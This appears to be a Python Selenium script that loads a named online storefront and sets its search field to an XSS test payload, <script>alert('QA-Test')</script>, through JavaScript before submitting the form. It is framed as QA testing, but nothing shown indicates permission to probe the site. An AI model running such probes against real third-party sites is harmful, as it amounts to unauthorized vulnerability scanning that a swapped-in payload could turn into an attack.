import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# 1. Spin up Chrome smoothly
options = webdriver.ChromeOptions()
options.add_argument("--start-maximized")
driver = webdriver.Chrome(options=options)

try:
    # 2. Open Matt Mathews' storefront
    driver.get("https://store.mattmathews.com/")

    # 3. Give the layout 5 seconds to load the core DOM structure
    wait = WebDriverWait(driver, 5)
    search_bar = wait.until(EC.presence_of_element_located((By.NAME, "q")))
    print("Found the target element structure inside the code base!")

    # 4. Use JavaScript to force-inject the XSS payload directly into the search bar
    test_string = "<script>alert('QA-Test')</script>"
    driver.execute_script("arguments[0].value = arguments[1];", search_bar, test_string)
    print(
        "JavaScript successfully force-injected the test payload directly past the overlays!"
    )

    time.sleep(3)  # Short pause to see the text sitting inside the search bar!

    # 5. Use JavaScript to force-submit the search form layout directly
    driver.execute_script("arguments[0].form.submit();", search_bar)
    print("Search form submitted successfully via JavaScript!")

    # Watch the final results page load up for 5 seconds
    time.sleep(5)

finally:
    # 6. Proper teardown
    driver.quit()
    print("Session finalized cleanly.")
